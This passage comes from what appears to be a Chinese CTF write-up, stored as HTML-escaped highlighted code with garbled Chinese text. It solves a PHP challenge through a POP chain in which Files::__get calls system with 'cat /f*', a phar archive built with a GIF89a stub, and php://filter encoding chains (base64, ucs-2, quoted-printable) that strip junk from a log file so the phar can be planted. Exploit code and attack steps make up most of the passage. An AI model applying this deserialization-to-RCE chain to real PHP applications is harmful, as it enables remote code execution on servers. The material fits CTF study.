&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">getFile&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$contents&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// å¯¹filenameè¿‡æ»¤
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;write&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$contents&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å†™å…¥å†…å®¹ phar
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$contents&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$contents&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// è¯»phar è§¦å‘ååºåˆ—åŒ–
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;è¯¥æ–‡ä»¶ä¸å­˜åœ¨æˆ–è€…å†…å®¹ä¸ºç©º&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Myerror&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// è¯»ä¸å­˜åœ¨å±æ€§
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">arg&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// ç›®æ ‡ å¯rce
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// arg = &amp;#39;cat /f*&amp;#39;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Myerror.class.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Myerror&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// new Files();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error_log&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/var/www/html/log/error.txt&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;log_errors&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__tostring&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$test&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">};&lt;/span> &lt;span style="color:#75715e">// Files::__get
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// test = &amp;#39;system&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ„é€ popé“¾æ—¶ï¼Œæ³¨æ„password&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Files&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$myerror&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Myerror&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">arg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;cat /f*&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$myerror&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$myerror&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$myerror&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $user-&amp;gt;password = [new User(), &amp;#34;check&amp;#34;]; è¿™æ ·ä¼šä½¿$userçš„ä¸¤ä¸ªå­—æ®µéƒ½èµ‹ä¸ä¸Šå€¼
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;check&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// O:4:&amp;#34;User&amp;#34;:2:{s:8:&amp;#34;username&amp;#34;;O:7:&amp;#34;Myerror&amp;#34;:2:{s:7:&amp;#34;message&amp;#34;;O:5:&amp;#34;Files&amp;#34;:2:{s:8:&amp;#34;filename&amp;#34;;N;s:3:&amp;#34;arg&amp;#34;;s:3:&amp;#34;dir&amp;#34;;}s:4:&amp;#34;test&amp;#34;;s:6:&amp;#34;system&amp;#34;;}s:8:&amp;#34;password&amp;#34;;a:2:{i:0;r:1;i:1;s:5:&amp;#34;check&amp;#34;;}}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç»æµ‹è¯•å¯ä»¥è§¦å‘ï¼Œä¹‹åå°±æ˜¯å¦‚ä½•å†™pharçš„é—®é¢˜äº†&lt;/p>
&lt;p>çœ‹ä»£ç å¯ä»¥çŸ¥é“æ²¡æœ‰ç›´æ¥çš„unserializeç‚¹ï¼Œé‚£å¤§æ¦‚ç‡æ˜¯pharï¼Œè™½ç„¶æ²¡æœ‰ä¸Šä¼ å¤„ ä½†æ˜¯Myerrorç±»çš„æ„é€ æ–¹æ³•ä¸­å¯ä»¥å†™æ—¥å¿—&lt;/p>
&lt;p>&lt;img src="https://i.loli.net/2021/11/28/a5WEKMOeYP8zcHg.png" alt="image.png">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æ—¥å¿—ä¸­æœ‰è„æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ©è¿‡æ»¤å™¨çš„ç¼–ç æ¥åˆ å»ï¼›é¦–å…ˆæ˜¯æ¸…ç©ºæ–‡ä»¶å†…å®¹ï¼Œå¯ä»¥ç”¨&lt;code>php://filter/read=consumed/resource=log/error.txt&lt;/code>&lt;/p>
&lt;p>ä¹‹åè§‚å¯Ÿæ—¥å¿—å†…å®¹ï¼Œè„æ•°æ®+æ–‡ä»¶å†…å®¹+è„æ•°æ®ï¼Œåªç”¨b64è‚¯å®šä¸è¡Œï¼Œæˆ‘ä»¬å°è¯•æŠŠé™¤æ–‡ä»¶ä¹‹å¤–çš„å…¶ä»–å†…å®¹å˜ä¸ºb64çš„éæ³•å­—ç¬¦ï¼Œè¿™æ ·æœ€åb64è§£ç å³å¯&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥å…ˆå°†æ•°æ®è½¬æ¢ä¸ºutf-16leçš„æ ¼å¼ï¼Œç”±åŸå…ˆçš„utf-8è½¬æ¢ä¸ºutf-16leæ—¶ï¼Œæ¯ä¸€ä½å­—ç¬¦åé¢éƒ½ä¼šç›´æ¥æ·»åŠ ä¸€ä¸ªä¸å¯è§å­—ç¬¦&lt;code>\0&lt;/code>ï¼Œå†è½¬å›utf-8æ—¶ï¼Œä¹‹ååé¢å¸¦&lt;code>\0&lt;/code>çš„æ‰ä¼šè¢«è½¬æ¢ å…¶ä½™çš„ä¼šè¢«å½“æˆä¹±ç ï¼›è¿™ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚&lt;/p>
&lt;p>&lt;img src="https://i.loli.net/2021/11/29/pAxRiFMUvS6lmLH.png" alt="image.png">&lt;/p>
&lt;p>é¢˜ä¸­utf-16leè¢«banäº†ï¼Œæˆ‘ä»¬ç”¨ucs-2æ¥ä»£æ›¿&lt;/p>
&lt;p>æœ€åè¦å¤„ç†çš„æ—¶ç©ºå­—èŠ‚ï¼Œ&lt;code>file_get_contents&lt;/code>åœ¨åŠ è½½æœ‰ç©ºå­—èŠ‚çš„æ–‡ä»¶æ—¶ä¼šæŠ¥warningï¼Œæˆ‘ä»¬ç”¨quoted-printableè¿™ç§ç¼–ç ï¼Œå³&lt;code>php://filter/convert.quoted-printable-decode&lt;/code>è¿™ç§è¿‡æ»¤å™¨ï¼›å®ƒå¯¹äºæ‰€æœ‰å¯æ‰“å°å­—ç¬¦çš„asciiç ï¼ˆé™¤&lt;code>=&lt;/code>ä»¥å¤–ï¼‰éƒ½ä¸å˜ï¼Œå¯¹äº&lt;code>=&lt;/code>å’Œä¸å¯æ‰“å°çš„asciiç ä»¥åŠéasciiç çš„æ•°æ®ç¼–ç æ—¶ ä¼šå…ˆå°†æ¯ä¸ªå­—èŠ‚çš„äºŒè¿›åˆ¶ä»£ç ç”¨ä¸¤ä¸ª16è¿›åˆ¶æ•°è¡¨ç¤º å†åœ¨å‰é¢åŠ ä¸€ä¸ªç­‰å·ï¼Œæ¯”å¦‚&lt;code>=&lt;/code>-&amp;gt;&lt;code>=3D&lt;/code>&lt;/p>
&lt;p>æˆ‘ä»¬çš„ç¼–ç é¡ºåº&lt;/p>
&lt;pre tabindex="0">&lt;code>base64-encode-&amp;gt; utf-8-&amp;gt; ucs-2-&amp;gt; convert.quoted-printable-decode
&lt;/code>&lt;/pre>&lt;p>ä¼šè¢«è§£ç çš„é¡ºåº&lt;/p>
&lt;pre tabindex="0">&lt;code>convert.quoted-printable-decode-&amp;gt; ucs-2-&amp;gt; utf-8-&amp;gt; base64-decode
&lt;/code>&lt;/pre>&lt;p>ç»è¿‡è¿™ä¸‰æ¬¡ç¼–ç åå°±ä¼šæœ‰çº¯å‡€çš„pharæ–‡ä»¶å†…å®¹&lt;/p>
&lt;p>æœ€æœ€æœ€åçš„è€ƒç‚¹ï¼Œ&lt;code>throw new Error&lt;/code>çš„å­˜åœ¨ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ”¹&lt;code>i:0&lt;/code>å’Œç­¾å&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$password&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Myerror&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Files&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Myerror&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Files&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$myerror&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Myerror&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">arg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;cat /f*&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$myerror&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$myerror&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$myerror&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;check&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Phar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;phar.phar&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">startBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GIF89a&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">addFromString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setMetadata&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ”¹ç­¾åå’Œ&lt;code>i:0&lt;/code>ï¼ˆç•¥&lt;/p>
&lt;p>ç¼–ç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;change.phar&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
